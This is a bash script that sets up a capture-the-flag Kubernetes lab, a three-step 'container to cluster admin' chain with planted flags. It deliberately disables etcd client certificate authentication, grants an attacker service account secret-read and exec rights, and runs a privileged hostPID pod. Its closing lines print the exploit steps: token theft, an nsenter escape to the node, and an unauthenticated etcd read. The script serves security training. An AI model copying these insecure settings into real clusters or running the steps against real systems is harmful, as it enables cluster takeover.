#!/bin/bash
set -euo pipefail
K8S_ID="chain2"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(dirname "$(dirname "$SCRIPT_DIR")")"
CLUSTER_NAME="cve-chain-k8s-admin"
source "$SCRIPT_DIR/../../scripts/k8s-common.sh"
FLAG1="${CVE_FLAG1:-flag{chain2-step1-rbac}}"
FLAG2="${CVE_FLAG2:-flag{chain2-step2-escape}}"
FLAG3="${CVE_FLAG3:-flag{chain2-step3-etcd-final}}"

echo "[Chain 2] Container to Cluster Admin — 3 steps, K8s only"

# Pre-create flag dir (must exist before Docker bind-mount)
mkdir -p /home/kianabin/cve-flags/chain2-flags
echo "$FLAG2" > /home/kianabin/cve-flags/chain2-flags/flag.txt

echo "[*] Creating unified KIND cluster with RBAC + privileged escape + etcd..."
kind create cluster --name "$CLUSTER_NAME" --config - << 'KINDCFG'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
  - role: control-plane
    image: kindest/node:v1.27.3
    extraMounts:
      - hostPath: /home/kianabin/cve-flags/chain2-flags
        containerPath: /chain-flags
    kubeadmConfigPatches:
      - |
        kind: ClusterConfiguration
        etcd:
          local:
            extraArgs:
              client-cert-auth: "false"
KINDCFG

kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

docker pull bitnami/kubectl:1.28 2>/dev/null || true
kind load docker-image bitnami/kubectl:1.28 --name "$CLUSTER_NAME" 2>/dev/null || true

# Step 1: namespace-scoped RBAC - secrets read ONLY in ns-ops (no cluster-wide reader)
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Namespace
metadata:
  name: ns-ops
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: ns-ops
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: attacker-ops
  namespace: ns-ops
rules:
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  - apiGroups: [""]
    resources: ["pods/exec"]
    verbs: ["create"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: attacker-ops
  namespace: ns-ops
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: ns-ops
roleRef:
  kind: Role
  name: attacker-ops
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: v1
kind: Pod
metadata:
  name: chain2-pod
  namespace: ns-ops
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: shell
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
YAML

kubectl create secret generic chain2-step1 --from-literal=flag="$FLAG1" -n ns-ops 2>/dev/null || true

# Step 2: privileged + hostPID escape pod (flag on the node, NOT mounted)
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: chain2-step2
  namespace: ns-ops
spec:
  hostPID: true
  containers:
    - name: escape
      image: bitnami/kubectl:1.28
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        privileged: true
YAML

# Step 3 final flag: custom etcd key (invisible to the Kubernetes API)
k8s_put_etcd_key "/chain2-final" "$FLAG3"

kubectl wait --for=condition=Ready pod/chain2-pod -n ns-ops --timeout=60s 2>/dev/null || true
kubectl wait --for=condition=Ready pod/chain2-step2 -n ns-ops --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[Chain 2] Ready"
echo "  Step 1: TOKEN=\$(kubectl exec -n ns-ops chain2-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
echo "          kubectl --token=\$TOKEN get secret chain2-step1 -n ns-ops"
echo "  Step 2: kubectl exec -n ns-ops chain2-step2 -- nsenter --target 1 --mount -- cat /chain-flags/flag.txt"
echo "  Step 3: from node shell: curl -k https://127.0.0.1:2379/v3/kv/range (key /chain2-final)"
